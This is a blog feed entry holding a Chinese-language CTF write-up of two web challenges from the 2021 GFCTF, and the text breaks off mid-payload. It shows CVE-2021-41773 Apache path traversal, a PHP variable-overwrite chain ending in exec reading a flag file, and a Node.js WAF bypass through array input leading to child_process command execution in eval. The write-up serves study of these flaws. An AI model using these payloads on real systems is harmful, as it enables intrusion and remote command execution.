<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to Arsene.Tang &#39;s Blog</title>
  
  <subtitle>一个喜欢web安全但菜的离谱的萌新</subtitle>
  <link href="https://arsenetang.github.io/atom.xml" rel="self"/>
  
  <link href="https://arsenetang.github.io/"/>
  <updated>2021-11-24T09:27:31.691Z</updated>
  <id>https://arsenetang.github.io/</id>
  
  <author>
    <name>Arsene.Tang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WP篇之解析2021 GFCTF中的两道Web</title>
    <link href="https://arsenetang.github.io/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/"/>
    <id>https://arsenetang.github.io/2021/11/24/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%902021%20GFCTF%E4%B8%AD%E7%9A%84%E4%B8%A4%E9%81%93Web/</id>
    <published>2021-11-23T16:00:00.000Z</published>
    <updated>2021-11-24T09:27:31.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解析2021-GFCTF中的两道Web"><a href="#解析2021-GFCTF中的两道Web" class="headerlink" title="解析2021 GFCTF中的两道Web"></a>解析2021 GFCTF中的两道Web</h1><p>上周天我们学校的校赛<code>GFCTF(</code>原<code>SWPUCTF)12th</code>顺利举行，我觉得其中的两道Web题都挺有意思的，也是唯一有解的两道Web题，接下来就来聊聊这两道Web题，如果有想复现的师傅可以加qq来私聊找我要哈</p><span id="more"></span><h2 id="1-Baby-web"><a href="#1-Baby-web" class="headerlink" title="1.Baby_web"></a>1.Baby_web</h2><p>这道题考的是一个<code>Apache 2.4.49</code>的一个目录穿越的<code>cve</code>漏洞，利用这个漏洞看到源码然后代码审计</p><p>进去之后提示都在注释中：</p><p><img src="https://i.loli.net/2021/11/23/54wtTM8O3cW19IA.png" alt="image.png"></p><p>告诉我们源码在上层目录中，要我们想办法去看上层目录，我们知道网页根目录是<code>/var/www/html</code>，那么它的上层目录就是<code>/var/www</code>了，但正常情况下我们肯定是看不到上一层的，这时候我们先抓个包：</p><p><img src="https://i.loli.net/2021/11/23/MBblDfR65YcmJnW.png" alt="image.png"></p><p>看到<code>Apache</code>的版本号是2.4.49，相信很多小伙伴已经意识到前段时间爆出来的<code>CVE-2021-41773</code>了，就是说这个版本的<code>Apache</code>存在目录穿越漏洞，我们可以利用这个漏洞去获取源码，具体大家可以自行百度，这里只放出一张很有意思的图，就是用这种方法目录穿越</p><p><img src="https://i.loli.net/2021/11/23/81U9PLNntYCMxFi.png" alt="image.png"></p><p>然后得到源码，<code>index.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);<span class="comment">//入口</span></span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);<span class="comment">//进入display函数，后续进行文件包含</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Temp</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>); <span class="comment">//把一个或多个数组合并为一个数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;  <span class="comment">//需要进入这一层</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);<span class="comment">//此目录下的任意文件</span></span><br><span class="line">            <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);<span class="comment">//变量覆盖 将date数组覆盖掉</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);<span class="comment">//让$template为index.html $space为admin</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);<span class="comment">//包含文件 需要包含./template/admin/index.html</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = trim(<span class="variable">$_params</span>); <span class="comment">//去掉数组前后的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123; <span class="comment">//以空格为分隔符将字符串分割为数组</span></span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123; <span class="comment">//遍历新生成的数组</span></span><br><span class="line">            <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>)); <span class="comment">//var 为等号 前 的内容</span></span><br><span class="line">            <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);<span class="comment">//val 为等号 后 的内容</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; <span class="comment">//存在$system[$var]就重新赋值</span></span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; <span class="comment">//不存在就放在$param这个数组里</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123; <span class="comment">//判断键名是否以param开头</span></span><br><span class="line">                            <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>)); <span class="comment">//intval()处理字符串直接返回0 </span></span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;        <span class="comment">//---------&gt;可以有 $p[0]=$t</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>); <span class="comment">//利用点</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/template/admin/index.html</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;--&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);//$mod参数可控，用这里调用listdata</span><br><span class="line">    ?&gt;&lt;div&gt; </span><br><span class="line">    &lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>接下来就是代码审计工作了，慢慢审，理清它之间的逻辑，一切比较重要的地方我都在代码上做了注释，其实整个代码逻辑是非常清晰的：</p><p><code>GET -&gt; display -&gt; getTempName -&gt; include</code> </p><p><code>POST-&gt; array_merge -&gt; extract -&gt; 由于有include，通过$mod进入listdata -&gt; 变量覆盖生成新数组 -&gt; switch -&gt; call_user_func_array</code></p><p>所以说payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line">space=admin&amp;mod=1 action=function name=phpinfo</span><br></pre></td></tr></table></figure><p>发现在disable_function中禁掉了很多命令执行的函数，但漏掉了<code>exec</code>，所以说直接用<code>exec</code>将flag带出来就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line">space=admin&amp;mod=1 action=function name=exec param1=cat$&#123;IFS&#125;/f*&gt;/var/www/html/1</span><br></pre></td></tr></table></figure><p>然后访问1就好了</p><h2 id="2-ez-calc"><a href="#2-ez-calc" class="headerlink" title="2.ez_calc"></a>2.ez_calc</h2><p>一道很有意思的一道nodejs的题，也是我第一次接触nodejs，nodejs的语法和js好像，从中学到了挺多东西的</p><p>首先是一个登录框，提示不要爆破，首先查看页面源码</p><p><img src="https://i.loli.net/2021/11/24/GvJWNATKx4k2rQ9.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.username.toLowerCase() !== <span class="string">&#x27;admin&#x27;</span> </span><br><span class="line">&amp;&amp; req.body.username.toUpperCase() === <span class="string">&#x27;ADMIN&#x27;</span> </span><br><span class="line">&amp;&amp; req.body.passwd === <span class="string">&#x27;admin123&#x27;</span>)&#123;                <span class="comment">// 登录成功，设置 session</span></span><br></pre></td></tr></table></figure><p>可以看到密码为admin123，账户名小写后不能为admin，大写之后为ADMIN，看似永远为假的判断，绕过它却很简单，绕过这个的办法就是利用特殊字符，比如通过Character.toUpperCose()后，ı会为I，但它经过Charocter.toLowerCose()后并不是i，所以说账户名为admın，登录成功，登录之后继续查看源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.body.calc;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.split<span class="string">``</span>.some(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.slice(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.slice(i + <span class="number">1</span>, calc.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//截取</span></span><br><span class="line">calc = calc.substring(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//去空</span></span><br><span class="line">calc = calc.replace(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.replace(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的同学过滤了一些比较危险的东西</span></span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于我这种代码能力比较差的人，审计这种代码是真挺头疼的，只有慢慢看；首先看最后有一个<code>eval</code>，应该是可以命令执行，但是它做了很多的过滤，正常<code>rce</code>的话肯定会触发<code>waf</code>，我们只有先看看它这个<code>waf</code>的逻辑，看看有没有绕过它的方法；首先它通过<code>split</code>会对输入的参数的每一位都会进行检查，如果出现了<code>/(flc&#39;\&quot;.</code>中的任意字符，就会将后面所有的字符都变成<code>*</code>，然后会将处理后的这个字符串进行截取操作，取前64位，在去除了空格，过滤了危险字符之后，传入<code>eval</code>中，看似非常完美的过滤，肯定是无法传入字符串了，但它忽略了一个问题就是，假如我们传入的不是字符串呢？我们知道在<code>PHP</code>中<strong>数组</strong>有很多神奇的操作可以绕过过滤，其实这里也可以尝试数组的，假如我们尝试传入数组<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,ccccc]</code>，这样<code>calc[i]</code>就不再是单个的字符，而变成了一个字符串了；那么<code>calc.length</code>也就是数组中元素的个数，也就是3了；如果传入<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,&quot;(&quot;,]</code>的话，那么按照这道题的逻辑，它在第3位发现了危险字符，那么就会将第三位以后的字符都替换成<code>*</code>，也就是处理成：<code>aaa***********</code>，而在数组中添加元素可以用<code>calc[]=aaaaa&amp;calc[]=bbbbb&amp;calc[]=ccccc</code>这种方式进行</p><p>那么假如说我们要让这个数组中的第一个五位字符的元素逃逸出来，我们就需要让数组的第五个元素中出现敏感字符，这样的话它就会让第五位以后的字符全变成<code>*</code>，而前五位字符就正常了；比如说像<code>[&quot;a(aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;,&quot;(&quot;]</code>，我们看看处理后它会变成什么样：</p><p><img src="https://i.loli.net/2021/11/24/P94qNWvxzMVtEsm.png" alt="image.png"></p><p>可以看到虽然说第一个元素中已经有了敏感元素<code>(</code>，但它还是被逃逸了出来，后续不触发waf的元素多了没有影响，所以说用这种方法就可以直接把我们要想要的字符串逃逸出来了，关于这个知识点可以去y1ng师傅的博客中深入学习：&lt;<a href="https://www.gem-love.com/websecurity/2070.html">颖奇L’Amore</a>&gt;</p><p>接下来我们就开始尝试构造<code>rce</code>的<code>payload</code>了，先来一个<code>ls /</code>，<code>payload</code>如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span 